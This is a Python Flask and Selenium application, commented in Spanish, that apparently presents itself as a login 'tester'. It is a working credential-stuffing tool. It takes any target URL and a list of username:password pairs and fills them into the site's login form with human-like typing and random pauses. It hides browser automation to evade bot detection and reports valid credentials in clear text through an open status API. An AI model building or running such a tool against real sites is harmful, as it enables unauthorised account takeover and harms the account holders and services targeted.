from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import os
from datetime import datetime
import threading

app = Flask(__name__, static_folder='.')
CORS(app)

# Estado global del test
test_state = {
    'running': False,
    'progress': 0,
    'total': 0,
    'current': '',
    'logs': [],
    'results': {'success': 0, 'failed': 0, 'valid_credentials': []}
}

def add_log(message, log_type='info'):
    """Añade un log con timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    test_state['logs'].append({
        'time': timestamp, 
        'message': message, 
        'type': log_type
    })
    if len(test_state['logs']) > 100:
        test_state['logs'].pop(0)
    print(f"[{timestamp}] [{log_type.upper()}] {message}")

class SeleniumTester:
    def __init__(self, target_url, headless=True):
        self.driver = None
        self.target_url = target_url
        self.headless = headless
        self.initial_url = None
        
    def setup_driver(self):
        """Configura Chrome con opciones para Railway"""
        add_log("Iniciando navegador Chrome...", "info")
        
        options = Options()
        
        # Opciones para headless y entornos de producción
        if self.headless:
            options.add_argument('--headless=new')
        
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-software-rasterizer')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        # Deshabilitar detección de webdriver
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        try:
            self.driver = webdriver.Chrome(options=options)
            
            # Ocultar webdriver
            self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': 'Object.defineProperty(navigator, "webdriver", {get: () => undefined})'
            })
            
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(10)
            
            add_log("Navegador iniciado correctamente", "success")
            return True
            
        except Exception as e:
            add_log(f"Error al iniciar navegador: {str(e)}", "error")
            return False
    
    def wait_for_page_load(self, timeout=30):
        """Espera a que la página cargue completamente"""
        try:
            add_log("Esperando carga de pagina...", "info")
            WebDriverWait(self.driver, timeout).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
            time.sleep(3)
            return True
        except TimeoutException:
            add_log("Timeout esperando carga de pagina", "error")
            return False
    
    def find_login_fields(self):
        """Encuentra campos de login con múltiples estrategias"""
        add_log("Buscando campos de login...", "info")
        
        if not self.wait_for_page_load():
            return None, None
        
        username_field = None
        password_field = None
        
        try:
            # Buscar todos los inputs visibles
            all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible_inputs = []
            
            for inp in all_inputs:
                try:
                    if inp.is_displayed() and inp.is_enabled():
                        inp_type = inp.get_attribute("type") or "text"
                        if inp_type not in ['hidden', 'submit', 'button', 'checkbox', 'radio']:
                            visible_inputs.append(inp)
                except:
                    continue
            
            # Buscar campo de contraseña
            for inp in visible_inputs:
                if inp.get_attribute("type") == "password":
                    password_field = inp
                    add_log("Campo de password encontrado", "success")
                    break
            
            # Buscar campo de usuario/email
            for inp in visible_inputs:
                inp_type = inp.get_attribute("type") or "text"
                placeholder = (inp.get_attribute("placeholder") or "").lower()
                name = (inp.get_attribute("name") or "").lower()
                
                if inp != password_field and inp_type in ["text", "email"]:
                    if any(k in placeholder or k in name for k in ['email', 'usuario', 'user', 'celular', 'phone']):
                        username_field = inp
                        add_log(f"Campo de usuario encontrado", "success")
                        break
            
            # Si no encontró usuario, tomar el primer campo que no sea password
            if not username_field and visible_inputs:
                for inp in visible_inputs:
                    if inp != password_field:
                        username_field = inp
                        add_log("Campo de usuario por posicion", "success")
                        break
            
            if username_field and password_field:
                add_log("Ambos campos encontrados", "success")
                return username_field, password_field
            
            add_log("No se encontraron los campos necesarios", "error")
            return None, None
            
        except Exception as e:
            add_log(f"Error buscando campos: {str(e)}", "error")
            return None, None
    
    def fill_and_submit(self, username_field, password_field, username, password):
        """Llena los campos y hace submit"""
        try:
            # Llenar usuario
            username_field.click()
            time.sleep(0.5)
            username_field.clear()
            time.sleep(0.3)
            
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.12))
            
            time.sleep(0.8)
            
            # Llenar contraseña
            password_field.click()
            time.sleep(0.5)
            password_field.clear()
            time.sleep(0.3)
            
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.12))
            
            time.sleep(1)
            
            # Buscar botón de submit
            submit_selectors = [
                "//button[@type='submit']",
                "//button[contains(text(), 'Iniciar')]",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Entrar')]",
                "//input[@type='submit']"
            ]
            
            for selector in submit_selectors:
                try:
                    button = self.driver.find_element(By.XPATH, selector)
                    if button.is_displayed():
                        button.click()
                        add_log("Click en boton de login", "info")
                        return True
                except:
                    continue
            
            # Fallback: Enter en password
            password_field.send_keys("\n")
            add_log("Enter en campo de password", "info")
            return True
            
        except Exception as e:
            add_log(f"Error llenando campos: {str(e)}", "error")
            return False
    
    def check_success(self):
        """Verifica si el login fue exitoso"""
        time.sleep(5)
        
        try:
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            # Verificar errores
            error_keywords = [
                'incorrecto', 'invalido', 'error', 'failed', 'wrong',
                'credenciales incorrectas', 'invalid credentials'
            ]
            
            for keyword in error_keywords:
                if keyword in page_source:
                    add_log(f"Error detectado: {keyword}", "error")
                    return False
            
            # Verificar si campos de login siguen presentes
            try:
                login_still = self.driver.find_elements(By.XPATH, "//input[@type='password']")
                if any(el.is_displayed() for el in login_still):
                    add_log("Campos de login aun visibles", "error")
                    return False
            except:
                pass
            
            # Verificar indicadores de éxito
            success_keywords = [
                'dashboard', 'welcome', 'bienvenido', 'logout', 
                'cerrar sesion', 'perfil', 'profile', 'account'
            ]
            
            success_count = sum(1 for k in success_keywords if k in page_source)
            url_changed = self.initial_url and current_url != self.initial_url
            
            if success_count >= 2 or (success_count >= 1 and url_changed):
                add_log(f"Login exitoso", "success")
                return True
            
            add_log(f"Login fallido", "error")
            return False
            
        except Exception as e:
            add_log(f"Error verificando resultado: {str(e)}", "error")
            return False
    
    def test_credential(self, username, password):
        """Prueba una credencial completa"""
        try:
            add_log(f"Probando: {username}", "info")
            
            self.driver.get(self.target_url)
            self.initial_url = self.driver.current_url
            time.sleep(2)
            
            user_field, pass_field = self.find_login_fields()
            if not user_field or not pass_field:
                return False
            
            if not self.fill_and_submit(user_field, pass_field, username, password):
                return False
            
            result = self.check_success()
            
            if result:
                add_log(f"CREDENCIAL VALIDA: {username}:{password}", "success")
            
            return result
                
        except Exception as e:
            add_log(f"Error probando credencial: {str(e)}", "error")
            return False
    
    def cleanup(self):
        """Cierra el navegador"""
        if self.driver:
            try:
                self.driver.quit()
                add_log("Navegador cerrado", "info")
            except:
                pass

def run_test_thread(target_url, credentials):
    """Ejecuta el test en un thread separado"""
    test_state['running'] = True
    test_state['progress'] = 0
    test_state['total'] = len(credentials)
    test_state['logs'] = []
    test_state['results'] = {'success': 0, 'failed': 0, 'valid_credentials': []}
    
    tester = SeleniumTester(target_url, headless=True)
    
    if not tester.setup_driver():
        test_state['running'] = False
        return
    
    try:
        for i, (username, password) in enumerate(credentials):
            if not test_state['running']:
                break
            
            test_state['current'] = f"{username}:****"
            test_state['progress'] = i + 1
            
            if tester.test_credential(username, password):
                test_state['results']['success'] += 1
                test_state['results']['valid_credentials'].append({
                    'username': username,
                    'password': password
                })
            else:
                test_state['results']['failed'] += 1
            
            time.sleep(random.uniform(2, 4))
            
    except Exception as e:
        add_log(f"Error inesperado: {str(e)}", "error")
    finally:
        tester.cleanup()
        test_state['running'] = False
        add_log("Test finalizado", "info")

# ============ RUTAS DE LA API ============

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/start', methods=['POST'])
def start_test():
    if test_state['running']:
        return jsonify({'error': 'Test ya esta corriendo'}), 400
    
    data = request.json
    target_url = data.get('target_url')
    credentials_text = data.get('credentials', '')
    
    if not target_url:
        return jsonify({'error': 'URL requerida'}), 400
    
    # Parsear credenciales
    credentials = []
    for line in credentials_text.strip().split('\n'):
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                username = parts[0].strip()
                password = parts[1].strip()
                if username and password:
                    credentials.append((username, password))
    
    if not credentials:
        return jsonify({'error': 'No hay credenciales validas'}), 400
    
    # Iniciar test en thread
    thread = threading.Thread(target=run_test_thread, args=(target_url, credentials))
    thread.daemon = True
    thread.start()
    
    return jsonify({'message': 'Test iniciado', 'total': len(credentials)})

@app.route('/api/stop', methods=['POST'])
def stop_test():
    test_state['running'] = False
    return jsonify({'message': 'Test detenido'})

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify(test_state)

@app.route('/api/clear', methods=['POST'])
def clear_logs():
    test_state['logs'] = []
    test_state['results'] = {'success': 0, 'failed': 0, 'valid_credentials': []}
    return jsonify({'message': 'Logs limpiados'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)